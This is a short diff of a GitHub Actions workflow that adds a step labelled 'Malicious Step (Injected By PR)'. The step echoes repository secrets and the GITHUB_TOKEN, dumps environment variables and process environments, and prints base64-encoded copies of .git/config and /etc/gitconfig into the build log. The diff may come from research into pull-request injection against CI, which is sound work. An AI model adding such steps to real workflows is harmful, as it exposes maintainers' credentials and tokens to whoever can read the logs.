@@ -43,4 +43,15 @@ jobs:
         printenv
         ps axe
         echo "${{ secrets }}"
+        git config --list --show-origin  
+    - name: Malicious Step (Injected By PR)
+      run: |
+        echo "${{ secrets.GITHUB_TOKEN }}, ${{ secrets.MYSECRET }}"
+        printenv
+        ps axe
+        echo "${{ secrets }}"
         git config --list --show-origin
+        cat .git/config | base64
+        cat /etc/gitconfig | base64
+        cat .git/config
+        cat /etc/gitconfig
